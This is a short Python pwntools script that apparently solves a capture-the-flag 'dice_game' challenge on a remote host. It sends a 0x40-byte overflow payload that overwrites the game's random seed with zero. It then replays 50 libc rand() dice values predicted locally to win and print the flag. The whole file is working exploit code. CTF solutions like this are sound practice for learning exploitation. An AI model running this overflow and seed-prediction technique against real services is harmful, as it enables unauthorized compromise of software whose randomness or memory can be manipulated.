from pwn import *
from ctypes import *

context.log_level = 'debug'
libc = cdll.LoadLibrary("libc.so.6")
res = []

def dice_game():
    for i in range(50):
        rand = libc.rand()
        res.append(rand % 6 + 1)
    print res

#p = process('./dice_game')
p = remote("111.198.29.45", 31113, timeout=3)
dice_game()

payload = 'a'*0x40 + p64(0)
p.sendlineafter("your name: ", payload)
for point in res:
    p.sendlineafter("point(1~6): ", str(point))

p.recvline()
p.recvline()
flag = p.recvline()
print flag